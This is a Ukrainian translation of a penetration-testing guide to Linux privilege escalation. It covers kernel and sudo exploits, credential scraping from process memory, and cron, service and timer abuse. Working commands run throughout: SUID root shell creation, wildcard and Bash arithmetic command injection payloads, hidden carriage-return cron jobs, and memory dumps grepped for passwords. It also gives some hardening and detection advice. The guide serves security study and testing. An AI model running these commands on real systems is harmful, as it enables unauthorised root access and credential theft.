# Підвищення привілеїв у Linux

{{#include ../../../banners/hacktricks-training.md}}

Для ширшого контексту та історичних робочих процесів enumeration порівняйте ресурси g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation і linux-private-i, перелічені в посиланнях.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Інформація про систему

### Інформація про ОС

Почнімо збирати інформацію про ОС, на якій запущено систему
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Якщо ви **маєте права на запис у будь-яку папку всередині змінної `PATH`**, ви можете перехопити деякі бібліотеки або бінарні файли:
```bash
echo $PATH
```
### Інформація про змінні середовища

Цікава інформація, паролі або API-ключі у змінних середовища?
```bash
(env || set) 2>/dev/null
```
### Експлойти ядра

Перевірте версію ядра та наявність exploit, який можна використати для підвищення привілеїв
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Ви можете знайти хороший список вразливих kernel і вже **скомпільовані exploits** тут: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) і [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Інші сайти, де можна знайти **скомпільовані exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Щоб видобути всі вразливі версії kernel із цього сайту, можна виконати:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Інструменти, які можуть допомогти знайти kernel exploits:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (виконується **на victim**, перевіряє лише exploits для kernel 2.x)

Завжди **шукайте версію kernel у Google** — можливо, ваша версія kernel зазначена в одному з kernel exploits, і тоді ви будете впевнені, що цей exploit дійсний.

Додаткові техніки експлуатації kernel:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Підвищення привілеїв у Linux — Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Версія Sudo

На основі вразливих версій sudo, зазначених у:
```bash
searchsploit sudo
```
За допомогою цього grep можна перевірити, чи є версія sudo вразливою.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Версії Sudo до 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) дозволяють непривілейованим локальним користувачам підвищити свої привілеї до root через опцію sudo `--chroot`, якщо файл `/etc/nsswitch.conf` використовується з каталогу, контрольованого користувачем.<sup>[[28]](#references)[[29]](#references)</sup>

Ось [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) для експлуатації цієї [уразливості](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Перед запуском exploit переконайтеся, що ваша версія `sudo` є уразливою та підтримує функцію `chroot`.

Додаткову інформацію наведено в оригінальному [повідомленні про уразливість](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Обхід host-based правил Sudo (CVE-2025-32462)

Sudo до версії 1.9.17p1 (заявлений уразливий діапазон: **1.8.8–1.9.17**) може обробляти host-based правила sudoers, використовуючи **ім’я хоста, надане користувачем**, з `sudo -h <host>` замість **справжнього імені хоста**. Якщо sudoers надає ширші привілеї на іншому хості, ви можете локально **spoof** цей хост.<sup>[[29]](#references)</sup>

Вимоги:
- Уразлива версія sudo
- Специфічні для хоста правила sudoers (хост не є поточним іменем хоста і не має значення `ALL`)

Приклад шаблону sudoers:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Експлуатація через spoofing дозволеного хоста:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Якщо визначення підробленого імені блокується, додайте його до `/etc/hosts` або використовуйте hostname, який уже зустрічається в логах/конфігураціях, щоб уникнути DNS-запитів.

#### sudo < v1.8.28

Від @sickrov
```
sudo -u#-1 /bin/bash
```
### Помилка перевірки підпису Dmesg

Перевірте **smasher2 box of HTB**, щоб переглянути **приклад** того, як цю vuln можна було б експлуатувати
```bash
dmesg 2>/dev/null | grep "signature"
```
### Додаткове перерахування системи
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Перелік можливих засобів захисту

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Вихід із контейнера

Якщо ви перебуваєте всередині контейнера, почніть із наведеного нижче розділу container-security, а потім перейдіть до сторінок зловживань, специфічних для runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Диски

Перевірте, **що змонтовано та розмонтовано**, де й навіщо. Якщо щось розмонтовано, можна спробувати змонтувати це та перевірити наявність приватної інформації
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Корисне програмне забезпечення

Перелічіть корисні бінарні файли
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Також перевірте, чи **встановлено будь-який компілятор**. Це корисно, якщо вам потрібно використати kernel exploit, оскільки рекомендується скомпілювати його на машині, де ви збираєтеся його використовувати (або на подібній).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Встановлене вразливе програмне забезпечення

Перевірте **версії встановлених пакетів і сервісів**. Можливо, встановлено стару версію Nagios (наприклад), яку можна було б exploit для підвищення привілеїв…\
Рекомендується вручну перевірити версію найбільш підозрілого встановленого програмного забезпечення.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Якщо у вас є SSH-доступ до машини, ви також можете використати **openVAS**, щоб перевірити наявність застарілого та вразливого програмного забезпечення, встановленого на машині.

> [!NOTE] > _Зверніть увагу, що ці команди покажуть багато інформації, яка здебільшого буде непотрібною, тому рекомендується використовувати такі застосунки, як OpenVAS або подібні, які перевірять, чи є версія будь-якого встановленого програмного забезпечення вразливою до відомих експлойтів_

## Процеси

Перегляньте, **які процеси** виконуються, і перевірте, чи має якийсь процес **більше привілеїв, ніж повинен** (можливо, tomcat виконується від імені root?).
```bash
ps aux
ps -ef
top -n 1
```
Завжди перевіряйте наявність запущених [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md), оскільки їх можна використати для підвищення привілеїв. **Linpeas** виявляє їх, перевіряючи параметр `--inspect` у командному рядку процесу.\
Також **перевірте свої привілеї щодо бінарних файлів процесів** — можливо, ви зможете перезаписати чийсь файл.

### Ланцюжки parent-child між користувачами

Дочірній процес, запущений від імені **іншого користувача**, ніж його батьківський процес, не обов’язково є malicious, але це корисний **сигнал для triage**. Деякі переходи очікувані (`root` запускає service user, менеджери входу створюють процеси сесії), але незвичні ланцюжки можуть виявити wrapper-и, debug helpers, persistence або слабкі межі довіри під час виконання.

Швидкий огляд:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Якщо ви виявили неочікуваний ланцюжок, перевірте командний рядок батьківського процесу та всі файли, що впливають на його поведінку (`config`, `EnvironmentFile`, helper scripts, робочий каталог, аргументи, доступні для запису). У кількох реальних шляхах privesc сам дочірній процес не був доступний для запису, але **config, яким керував батьківський процес**, або ланцюжок helper були доступні для зміни.

### Видалені виконувані файли та видалені відкриті файли

Артефакти середовища виконання часто залишаються доступними **після видалення**. Це корисно як для підвищення привілеїв, так і для відновлення доказів із процесу, який уже має відкриті конфіденційні файли.

Перевірте видалені виконувані файли:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Якщо `/proc/<PID>/exe` вказує на `(deleted)`, процес усе ще запускає старий binary image з пам’яті. Це вагомий сигнал для розслідування, оскільки:

- видалений executable може містити цікаві strings або credentials
- запущений процес усе ще може відкривати корисні file descriptors
- видалений privileged binary може свідчити про нещодавнє втручання або спробу cleanup

Зберіть усі deleted-open files глобально:
```bash
lsof +L1
```
Якщо ви знайдете цікавий дескриптор, відновіть його безпосередньо:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Це особливо цінно, коли процес усе ще має відкритими видалений secret, script, database export або flag file.

### Моніторинг процесів

Ви можете використовувати такі tools, як [**pspy**](https://github.com/DominicBreuker/pspy), для моніторингу процесів. Це може бути дуже корисно для виявлення вразливих процесів, які часто виконуються або запускаються після виконання певного набору вимог.

### Пам'ять процесів

Деякі сервіси сервера зберігають **credentials у відкритому вигляді всередині пам'яті**.\
Зазвичай для читання пам'яті процесів, що належать іншим користувачам, потрібні **root-привілеї**, тому це зазвичай корисніше, коли ви вже root і хочете знайти додаткові credentials.\
Однак пам'ятайте, що **звичайний користувач може читати пам'ять процесів, якими він володіє**.

> [!WARNING]
> Зверніть увагу, що сьогодні більшість машин **типово не дозволяють ptrace**, а це означає, що ви не можете зробити dump інших процесів, які належать вашому непривілейованому користувачу.
>
> Файл _**/proc/sys/kernel/yama/ptrace_scope**_ контролює доступність ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: усі процеси можна debug, якщо вони мають той самий uid. Це класичний спосіб роботи ptracing.
> - **kernel.yama.ptrace_scope = 1**: debug можна виконувати лише для дочірнього процесу.
> - **kernel.yama.ptrace_scope = 2**: лише admin може використовувати ptrace, оскільки для цього потрібна capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: жодні процеси не можна trace за допомогою ptrace. Після встановлення цього значення потрібне перезавантаження, щоб знову ввімкнути ptracing.

#### GDB

Якщо у вас є доступ до пам'яті FTP-сервісу (наприклад), ви можете отримати Heap і виконати пошук credentials усередині нього.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ID процесу **maps показує, як пам’ять відображається у віртуальному адресному просторі цього процесу**; також він показує **дозволи кожного відображеного регіону**. Псевдофайл **mem відкриває доступ безпосередньо до пам’яті процесу**. З файлу **maps** ми дізнаємося, які **регіони пам’яті доступні для читання**, а також їхні зміщення. Використовуючи цю інформацію, ми переміщуємося **у файлі mem до потрібних позицій і записуємо всі доступні для читання регіони** у файл.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` надає доступ до **фізичної** пам’яті системи, а не до віртуальної пам’яті. Доступ до віртуального адресного простору kernel можна отримати за допомогою /dev/kmem.\
Зазвичай `/dev/mem` доступний для читання лише користувачеві **root** і групі **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump — це Linux-версія класичного інструмента ProcDump із набору Sysinternals для Windows. Завантажте його тут: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Інструменти

Щоб скинути пам’ять процесу, можна використати:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Ви можете вручну видалити вимоги root і скинути пам’ять процесу, яким володієте
- Script A.5 з [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (потрібен root)

### Облікові дані з пам’яті процесу

#### Приклад вручну

Якщо ви виявили, що процес автентифікації запущений:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Ви можете створити дамп процесу (див. попередні розділи, щоб знайти різні способи створення дампу пам’яті процесу) і пошукати облікові дані в пам’яті:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Інструмент [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **викрадає облікові дані у відкритому вигляді з пам’яті** та деяких **відомих файлів**. Для належної роботи йому потрібні root-привілеї.

| Можливість                                      | Назва процесу        |
| ------------------------------------------------ | -------------------- |
| Пароль GDM (Kali Desktop, Debian Desktop)        | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (активні FTP-підключення)                 | vsftpd               |
| Apache2 (активні сеанси HTTP Basic Auth)         | apache2              |
| OpenSSH (активні SSH-сеанси — використання Sudo) | sshd:                |

#### Пошукові регулярні вирази/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Заплановані/Cron jobs

### Crontab UI (alseambusher), що працює від root — web-based scheduler privesc

Якщо web-панель “Crontab UI” (alseambusher/crontab-ui) працює від root і прив’язана лише до loopback, її все одно можна досягти через SSH local port-forwarding і створити привілейоване завдання для ескалації.<sup>[[1]](#references)[[4]](#references)</sup>

Типовий ланцюжок
- Виявити порт, доступний лише через loopback (наприклад, 127.0.0.1:8000), і Basic-Auth realm за допомогою `ss -ntlp` / `curl -v localhost:8000`
- Знайти облікові дані в operational artifacts:
- Резервні копії/скрипти з `zip -P <password>`
- systemd unit, що розкриває `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Створити тунель і увійти:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Створіть job із високими привілеями та запустіть негайно (створює SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Використайте його:
```bash
/tmp/rootshell -p   # root shell
```
Посилення безпеки
- Не запускайте Crontab UI від імені root; використовуйте окремого користувача з мінімальними дозволами
- Прив’яжіть до localhost і додатково обмежте доступ через firewall/VPN; не використовуйте паролі повторно
- Не вбудовуйте секрети у unit files; використовуйте secret stores або EnvironmentFile, доступний лише root
- Увімкніть аудит/логування для запусків завдань на вимогу

Перевірте, чи є вразливим якесь заплановане завдання. Можливо, ви зможете скористатися скриптом, який виконується від імені root (wildcard vuln? можна змінити файли, які використовує root? використати symlinks? створити спеціальні файли в каталозі, який використовує root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Якщо використовується `run-parts`, перевірте, які назви дійсно виконуватимуться:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Це дозволяє уникнути хибнопозитивних результатів. Директорія, доступна для запису та періодично оброблювана, корисна лише тоді, коли ім’я вашого payload відповідає локальним правилам `run-parts`.

### Шлях Cron

Наприклад, у _/etc/crontab_ можна знайти PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Зверніть увагу, що користувач "user" має права на запис до /home/user_)

Якщо в цьому crontab користувач root намагається виконати певну команду або скрипт без налаштування шляху. Наприклад: _\* \* \* \* root overwrite.sh_\
Тоді можна отримати root shell, використовуючи:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Якщо script, який виконується від імені root, містить “**\***” усередині команди, це можна використати для виконання неочікуваних дій (наприклад, privesc). Приклад:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Якщо перед wildcard указано шлях, наприклад** _**/some/path/\***_ **, він не є вразливим (навіть** _**./\***_ **не є).**

Ознайомтеся з наведеною нижче сторінкою, щоб дізнатися про інші tricks експлуатації wildcard:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Ін'єкція Bash arithmetic expansion у cron log parsers

Bash виконує parameter expansion і command substitution перед arithmetic evaluation у ((...)), $((...)) та let. Якщо root cron/parser читає ненадійні поля log і передає їх в arithmetic context, attacker може ін'єктувати command substitution $(...), яка виконається з правами root під час запуску cron.<sup>[[22]](#references)</sup>

- Чому це працює: У Bash expansions відбуваються в такому порядку: parameter/variable expansion, command substitution, arithmetic expansion, потім word splitting і pathname expansion. Тому значення на кшталт `$(/bin/bash -c 'id > /tmp/pwn')0` спочатку підставляється (виконуючи command), а потім залишкове numeric `0` використовується для arithmetic, завдяки чому script продовжує виконання без помилок.

- Типовий вразливий pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Експлуатація: доможіться запису attacker-controlled text у parsed log так, щоб numeric-looking field містило command substitution і завершувалося digit. Переконайтеся, що ваша command не виводить дані в stdout (або перенаправте його), щоб arithmetic залишався valid.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Перезапис cron script і symlink

Якщо ви **можете змінювати cron script**, який виконується root, отримати shell дуже просто:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Якщо скрипт, який виконується від імені **root**, використовує **каталог, до якого ви маєте повний доступ**, можливо, варто видалити цю папку та **створити папку-символічне посилання на іншу**, у якій міститься скрипт під вашим контролем.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Перевірка символьних посилань і безпечніша робота з файлами

Під час аналізу привілейованих скриптів/бінарних файлів, які читають або записують файли за шляхом, перевіряйте, як обробляються посилання:

- `stat()` переходить за символьним посиланням і повертає метадані цільового об’єкта.
- `lstat()` повертає метадані самого посилання.
- `readlink -f` і `namei -l` допомагають визначити кінцеву ціль і показати дозволи для кожного компонента шляху.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Для defenders/developers безпечніші патерни проти symlink tricks включають:

- `O_EXCL` з `O_CREAT`: завершувати операцію помилкою, якщо path уже існує (блокує попередньо створені attacker-ом links/files).
- `openat()`: працювати відносно file descriptor довіреного directory.
- `mkstemp()`: атомарно створювати тимчасові files із безпечними permissions.

### Custom-signed cron binaries with writable payloads
Blue teams іноді "підписують" cron-driven binaries, зберігаючи custom ELF section у файл і виконуючи їх як root лише після пошуку vendor string за допомогою grep. Якщо цей binary доступний для запису групі (наприклад, `/opt/AV/periodic-checks/monitor`, власник `root:devs 770`) і ви можете зробити leak signing material, можна підробити section і hijack-нути cron task:<sup>[[2]](#references)</sup>

1. Використайте `pspy`, щоб перехопити verification flow. В Era root виконував `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, потім `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, а після цього виконував file.
2. Відтворіть очікуваний certificate за допомогою leaked key/config (із `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Створіть malicious replacement (наприклад, drop SUID bash, додайте свій SSH key) і вбудуйте certificate у `.text_sig`, щоб grep успішно завершився:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Перезапишіть scheduled binary, зберігши execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Дочекайтеся наступного запуску cron; щойно naive signature check завершиться успішно, ваш payload запуститься від імені root.

### Часті cron jobs

Ви можете monitor-ити processes, щоб знаходити processes, які виконуються кожні 1, 2 або 5 хвилин. Можливо, ви зможете скористатися цим і виконати privilege escalation.

Наприклад, щоб **monitor-ити кожні 0.1 с протягом 1 хвилини**, **сортувати за commands, що виконувалися рідше**, і видалити commands, які виконувалися найчастіше, можна виконати:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Також можна використовувати** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (він відстежуватиме й перелічуватиме кожен запущений процес).

### Root-бекапи, які зберігають установлені атакувальником біти режиму (pg_basebackup)

Якщо cron, що працює від root, запускає `pg_basebackup` (або будь-яке рекурсивне копіювання) для каталогу бази даних, до якого у вас є права на запис, можна розмістити **SUID/SGID binary**, який буде повторно скопійовано як **root:root** із тими самими бітами режиму до вихідного каталогу бекапу.<sup>[[26]](#references)</sup>

Типовий процес виявлення (як користувач DB із низькими привілеями):
- Використайте `pspy`, щоб виявити root cron, який щось на кшталт `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` запускає щохвилини.
- Переконайтеся, що вихідний кластер (наприклад, `/var/lib/postgresql/14/main`) доступний вам для запису, а призначення (`/opt/backups/current`) після виконання завдання належить root.

Експлуатація:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Це працює, оскільки `pg_basebackup` зберігає біти режиму доступу під час копіювання кластера; коли його запускає root, файли призначення успадковують **власність root + вибрані атакувальником SUID/SGID**. Будь-яка подібна привілейована процедура резервного копіювання/копіювання, яка зберігає дозволи та записує дані у виконуване місце, є вразливою.

### Невидимі cron jobs

Можна створити cronjob, **додавши символ повернення каретки після коментаря** (без символу нового рядка), і cron job працюватиме. Приклад (зверніть увагу на символ повернення каретки):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Щоб виявити такий тип прихованого проникнення, перевіряйте cron-файли за допомогою інструментів, які відображають керівні символи:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Сервіси

### Файли _.service_, доступні для запису

Перевірте, чи можете ви записувати в будь-який файл `.service`; якщо так, ви **можете змінити його**, щоб він **виконував** ваш **backdoor, коли** сервіс **запускається**, **перезапускається** або **зупиняється** (можливо, вам доведеться зачекати, поки машину буде перезавантажено).\
Наприклад, створіть свій backdoor усередині .service-файлу за допомогою **`ExecStart=/tmp/script.sh`**

### Бінарні файли сервісів, доступні для запису

Майте на увазі, що якщо у вас є **дозволи на запис до бінарних файлів, які виконуються сервісами**, ви можете змінити їх, додавши backdoor, щоб під час повторного виконання сервісів backdoor було виконано.

### systemd PATH — Відносні шляхи

Ви можете переглянути PATH, який використовується **systemd**, за допомогою:
```bash
systemctl show-environment
```
Якщо ви виявите, що можете **записувати** в будь-які папки цього шляху, можливо, ви зможете **підвищити привілеї**. Потрібно шукати **відносні шляхи, що використовуються у файлах конфігурації служб**, наприклад:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Потім створіть **виконуваний файл** з **такою самою назвою, як у бінарного файлу з відносним шляхом**, у доступній для запису теці з PATH systemd, і коли service буде запущено для виконання вразливої дії (**Start**, **Stop**, **Reload**), буде виконано ваш **backdoor** (непривілейовані користувачі зазвичай не можуть запускати/зупиняти services, але перевірте, чи можете ви використовувати `sudo -l`).

**Дізнайтеся більше про services за допомогою `man systemd.service`.**

## **Таймери**

**Таймери** — це unit-файли systemd, назви яких закінчуються на `**.timer**` і які керують файлами `**.service**` або подіями. **Таймери** можна використовувати як альтернативу cron, оскільки вони мають вбудовану підтримку подій календарного та монотонного часу й можуть запускатися асинхронно.

Перерахувати всі таймери можна за допомогою:
```bash
systemctl list-timers --all
```
### Таймери, доступні для запису

Якщо ви можете змінити таймер, ви можете змусити його виконувати деякі об'єкти `systemd.unit` (наприклад, `.service` або `.target`).
```bash
Unit=backdoor.service
```
У документації можна прочитати, що таке Unit:

> Unit, який потрібно активувати після завершення роботи цього таймера. Аргументом є ім’я unit без суфікса ".timer". Якщо не вказано, це значення за замовчуванням відповідає service з такою самою назвою, як і timer unit, за винятком суфікса. (Див. вище.) Рекомендується, щоб назви активованого unit і timer unit були ідентичними, за винятком суфікса.

Отже, щоб використати цю permission, потрібно:

- Знайти systemd unit (наприклад, `.service`), який **виконує бінарний файл, доступний для запису**
- Знайти systemd unit, який **виконує відносний шлях**, і мати **права на запис** до **systemd PATH** (щоб видати себе за цей executable)

**Дізнайтеся більше про таймери за допомогою `man systemd.timer`.**

### **Увімкнення таймера**

Щоб увімкнути таймер, потрібні root privileges і виконання:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Зверніть увагу: **timer** **активується** шляхом створення symlink на нього за адресою `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

